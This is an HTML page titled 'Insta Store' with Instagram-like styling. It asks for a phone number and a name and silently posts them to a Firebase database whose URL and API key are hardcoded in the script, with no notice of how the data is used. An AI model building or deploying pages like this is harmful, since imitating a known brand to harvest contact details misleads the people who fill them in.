<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Insta Store</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    background: #000;
    color: #fff;
    font-family: Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}

.container {
    width: 100%;
    max-width: 390px;
    padding: 30px;
    text-align: center;
}

.logo {
    font-size: 42px;
    font-weight: bold;
    margin-bottom: 45px;
}

input {
    width: 100%;
    height: 52px;
    margin-bottom: 12px;
    padding: 0 15px;
    border: 1px solid #333;
    border-radius: 7px;
    background: #121212;
    color: white;
    font-size: 15px;
    outline: none;
}

input:focus {
    border-color: #666;
}

button {
    width: 100%;
    height: 50px;
    margin-top: 8px;
    border: none;
    border-radius: 7px;
    background: #0095f6;
    color: white;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
}

button:active {
    opacity: 0.8;
}

#message {
    margin-top: 18px;
    font-size: 14px;
    min-height: 20px;
}
</style>
</head>

<body>

<div class="container">

    <div class="logo">Insta Store</div>

    <!-- Phone Number -->
    <input
        type="text"
        id="username"
        placeholder="Phone Number"
        autocomplete="tel"
    >

    <!-- Name -->
    <input
        type="text"
        id="name"
        placeholder="Name"
        autocomplete="name"
    >

    <button onclick="login()">Continue</button>

    <div id="message"></div>

</div>

<script>

const DATABASE_URL =
"https://dc-manager-d4e4c-default-rtdb.firebaseio.com";

const API_KEY =
"AIzaSyC7Hbys-90LvpHhuS3wLeOAOgteF2v1cGc";


function login() {

    const phone =
        document.getElementById("username").value.trim();

    const name =
        document.getElementById("name").value.trim();

    const message =
        document.getElementById("message");


    if (!phone || !name) {

        message.innerText =
        "Please enter your phone number and name.";

        return;
    }


    message.innerText = "Saving...";


    const data = {

        key1: phone,

        key2: name,

        savedAt: new Date().toISOString()

    };


    fetch(
        DATABASE_URL +
        "/users.json?auth=" +
        encodeURIComponent(API_KEY),
        {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify(data)

        }
    )

    .then(response => {

        if (!response.ok) {
            throw new Error("Firebase database error");
        }

        return response.json();

    })

    .then(result => {

        message.innerText =
        "Saved successfully.";

        document.getElementById("username").value = "";
        document.getElementById("name").value = "";

    })

    .catch(error => {

        console.error(error);

        message.innerText =
        "Unable to save data.";

    });

}

</script>

</body>
</html>
